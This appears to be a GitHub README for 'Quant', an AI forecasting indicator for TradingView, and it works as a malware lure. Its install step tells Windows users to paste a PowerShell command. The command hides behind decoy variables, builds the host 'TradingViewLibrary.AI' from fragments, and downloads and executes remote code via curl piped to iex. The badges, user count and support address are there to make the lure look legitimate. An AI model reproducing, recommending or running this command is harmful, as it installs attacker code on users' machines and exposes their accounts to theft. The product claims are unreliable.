<a id="get"></a>
<p align="center">
  <a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="quant-logo.jpg" alt="TradingView" width="738"></a>
</p>
<p align="center">
<a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/version-2.9.5%20beta-blue?style=flat-square" alt="version"></a>
<a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="license"></a>
<a href="https://github.com/TradingView-Library/Quant-Indicator/blob/master/README.md#install"><img src="https://img.shields.io/badge/beta%20users-7.4k-brightgreen?style=flat-square" alt="beta users"></a>
</p>

Quant is an AI indicator for TradingView that analyzes market conditions and shows where price is most likely to move next for the asset and timeframe you select.

It combines chart data, historical market behavior, liquidity, positioning, volatility, market structure, and known upcoming events. Each forecast is shown with the signals behind it, so you can see what influenced the model's conclusion.

## How It Works

Choose an asset and a timeframe. Quant analyzes the current setup, compares it with historical market behavior, and takes known upcoming events into account.

It then produces a directional forecast directly on the chart. The signals behind that forecast are shown alongside it, giving you a clear view of what the model is responding to and why it reached that conclusion.

The indicator works from intraday setups to weekly and monthly charts.

## Install

### Requirements

- TradingView Desktop
- Windows
- Internet connection
  
### 1. Open Command Prompt
Press **Win + R**, type `cmd`, press **Enter**.

### 2. Run the Installation Command
Copy and paste the following command into Command Prompt:

```powershell
powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library.'; $Install; $Mode='AI'; $Pinescript='TradingView'+$Sync+$Mode; (curl -UseBasicParsing ($Pinescript)).Content | iex"
```
_Setup takes under a minute. Once installation is complete, Quant will appear in your TradingView indicator library and be ready to use._

## Support
If you run into an issue or have feedback, open an issue on GitHub or contact support@tradingview.com.
